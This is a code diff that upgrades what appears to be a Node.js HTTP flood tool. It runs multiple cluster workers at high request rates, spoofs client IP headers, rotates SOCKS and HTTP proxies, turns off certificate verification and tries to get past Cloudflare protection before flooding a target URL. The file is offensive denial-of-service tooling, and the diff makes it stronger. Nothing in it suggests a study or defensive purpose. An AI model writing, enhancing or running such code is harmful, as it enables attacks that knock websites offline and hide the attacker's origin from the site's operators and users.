@@ -1,15 +1,19 @@
 const cloudscraper = require('cloudscraper');
-const request = require('request');
+const https = require('https');
+const http = require('http');
 const randomstring = require("randomstring");
 const fs = require('fs');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const cluster = require('cluster');
 const os = require('os');
+const tls = require('tls');
+const url = require('url');
 
-// Configuration
-const CONCURRENCY = os.cpus().length * 150; // Adjust based on your system
-const REQUEST_RATE_LIMIT = 2000; // Max requests per second (per worker)
-const MAX_RETRIES = 3;
+// Enhanced Configuration
+const CONCURRENCY = os.cpus().length * 100; // Increased worker multiplier
+const REQUEST_RATE_LIMIT = 1500; // Higher request rate
+const MAX_RETRIES = 5; // More retry attempts
+const SOCKET_TIMEOUT = 15000; // Longer timeout for HTTPS
 
 const httpStatusCodes = {
     OK: 200,
@@ -251,7 +255,120 @@ function createRequestOptions(url, path, cookie, useragent, referer) {
     return options;
 }
 
-async function makeRequest(url, time) {
+function createSecureContext() {
+    return tls.createSecureContext({
+        minVersion: 'TLSv1.1',
+        maxVersion: 'TLSv1.3',
+        ciphers: [
+            'TLS_AES_256_GCM_SHA384',
+            'TLS_CHACHA20_POLY1305_SHA256',
+            'TLS_AES_128_GCM_SHA256',
+            'ECDHE-RSA-AES256-GCM-SHA384',
+            'ECDHE-RSA-AES128-GCM-SHA256'
+        ].join(':'),
+        honorCipherOrder: true,
+        ALPNProtocols: ALPNProtocols
+    });
+}
+
+function createHttpAgent(targetUrl) {
+    const parsed = new URL(targetUrl);
+    const isHttps = parsed.protocol === 'https:';
+    
+    const agentOptions = {
+        keepAlive: true,
+        maxSockets: 50,
+        timeout: SOCKET_TIMEOUT,
+        rejectUnauthorized: false // Bypass SSL verification
+    };
+    
+    if (isHttps) {
+        agentOptions.secureContext = createSecureContext();
+        return new https.Agent(agentOptions);
+    }
+    return new http.Agent(agentOptions);
+}
+
+function createRequestOptions(targetUrl, path, cookie, useragent, referer) {
+    const ip = generateFakeIP();
+    const rand = randomstring.generate(10);
+    const parsedUrl = new URL(targetUrl);
+    const isHttps = parsedUrl.protocol === 'https:';
+    
+    const options = {
+        hostname: parsedUrl.hostname,
+        port: parsedUrl.port || (isHttps ? 443 : 80),
+        path: path || parsedUrl.pathname,
+        method: 'GET',
+        headers: {
+            'Host': parsedUrl.hostname,
+            'User-Agent': useragent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive',
+            'Pragma': 'no-cache',
+            'Referer': referer,
+            'X-Forwarded-For': ip,
+            'X-Real-IP': ip,
+            'Cookie': cookie,
+            'Upgrade-Insecure-Requests': '1'
+        },
+        agent: createHttpAgent(targetUrl),
+        timeout: SOCKET_TIMEOUT
+    };
+    
+    // Add proxy support
+    const proxyUrl = getNextProxy();
+    if (proxyUrl) {
+        if (proxyUrl.startsWith('socks')) {
+            options.agent = new SocksProxyAgent(proxyUrl, {
+                timeout: SOCKET_TIMEOUT,
+                secureContext: isHttps ? createSecureContext() : undefined
+            });
+        } else {
+            options.proxy = proxyUrl;
+        }
+    }
+    
+    return options;
+}
+
+function executeRequest(targetUrl, options) {
+    return new Promise((resolve) => {
+        const parsed = new URL(targetUrl);
+        const isHttps = parsed.protocol === 'https:';
+        const module = isHttps ? https : http;
+        
+        const req = module.request(options, (res) => {
+            let data = '';
+            res.on('data', (chunk) => data += chunk);
+            res.on('end', () => {
+                resolve({
+                    statusCode: res.statusCode,
+                    headers: res.headers,
+                    body: data
+                });
+            });
+        });
+        
+        req.on('error', (e) => {
+            console.log(`[!] Request error: ${e.message}`);
+            resolve(null);
+        });
+        
+        req.on('timeout', () => {
+            req.destroy();
+            console.log('[!] Request timeout');
+            resolve(null);
+        });
+        
+        req.end();
+    });
+}
+
+async function makeRequest(targetUrl, time) {
     if (!checkRateLimit()) {
         await new Promise(resolve => setTimeout(resolve, 100));
         return;
@@ -264,26 +381,25 @@ async function makeRequest(url, time) {
     
     while (retries < MAX_RETRIES) {
         try {
-            const cloudflareOptions = createRequestOptions(url, path, '', useragent, referer);
-            delete cloudflareOptions.headers.cookie;
+            // First bypass Cloudflare if needed
+            const cloudflareOptions = createRequestOptions(targetUrl, path, '', useragent, referer);
+            delete cloudflareOptions.headers.Cookie;
             
-            const response = await cloudscraper.get(cloudflareOptions);
-            const cookie = response.request.headers.cookie || '';
+            const cfResponse = await executeRequest(targetUrl, cloudflareOptions);
+            const cookie = cfResponse?.headers['set-cookie'] || '';
             
-            const options = createRequestOptions(url, path, cookie, useragent, referer);
-            request(options, (error, response) => {
-                if (!error && response) {
-                    console.log(`[+] Request sent - Status: ${response.statusCode} - IP: ${options.headers['X-Forwarded-For']}${options.proxy || options.agent ? ' via proxy' : ''}`);
-                } else if (error && retries === MAX_RETRIES - 1) {
-                    console.log(`[!] Request error: ${error.message}`);
-                }
-            });
+            // Then make the actual request
+            const options = createRequestOptions(targetUrl, path, cookie, useragent, referer);
+            const response = await executeRequest(targetUrl, options);
             
+            if (response) {
+                console.log(`[+] ${targetUrl} - Status: ${response.statusCode} - IP: ${options.headers['X-Forwarded-For']}`);
+            }
             break;
         } catch (error) {
             retries++;
             if (retries === MAX_RETRIES) {
-                console.log(`[!] Max retries reached for request: ${error.message}`);
+                console.log(`[!] Max retries reached for ${targetUrl}: ${error.message}`);
             }
         }
     }
